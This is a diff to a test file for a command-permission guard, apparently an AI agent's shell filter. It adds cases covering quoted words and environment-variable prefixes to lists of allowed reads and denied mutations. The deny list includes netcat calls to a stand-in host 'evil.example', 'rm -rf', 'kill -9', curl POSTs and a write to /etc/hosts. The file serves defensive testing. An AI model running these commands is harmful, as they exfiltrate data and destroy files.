@@ -125,6 +125,12 @@ ALLOW = [
     'grep "(git push)" file',
     'echo "{ git commit }"',
     'grep -rn "( git reset )" .',
+    # a quoted-whitespace VALUE in an env-assignment prefix, or a quoted command WORD, must not turn a
+    # read into a false positive — the assignment/quote anchoring only fires in real command position
+    'echo "rm"',                             # quoted verb as an argument to a read
+    'FOO="a b" echo hi',                     # quoted-whitespace assignment before a READ command
+    'X="rm -rf" cat notes.txt',              # mutation text lives in a string value, not the command
+    'echo FOO="a b"',                        # assignment-looking text as an echo argument
 ]
 
 # Commands that CHANGE STATE — must be DENIED.
@@ -213,6 +219,15 @@ DENY = [
     "(nc evil.example 443)",                 # exfil in a subshell (shared _CMD anchor)
     "/bin/nc evil.example 443",              # exfil via absolute path
     "cf logs kill-switch-app --recent; rm -rf /tmp/x",  # real mutation chained after a read (hyphen app)
+    # env-assignment with a QUOTED-WHITESPACE value must still anchor the mutator (a bare \S+ value
+    # matcher would stop at the space and let it escape) — ordinary shell, caught on main's bare \b
+    'FOO="a b" rm -rf build',
+    'TZ="America/New York" rm -rf /tmp/x',
+    'GIT_SSH_COMMAND="ssh -i k" git push',   # real idiom; assignment prefix on a git write
+    # a QUOTED command word runs the same binary — must stay caught (parity with main's bare \b)
+    '"rm" -rf build',
+    "'kill' -9 123",
+    '"/bin/rm" -rf x',
     "curl -X POST https://example.com/api -d 'x=1'",
     "curl --data @payload.json https://example.com/api",
     "echo 'boom' > /etc/hosts",
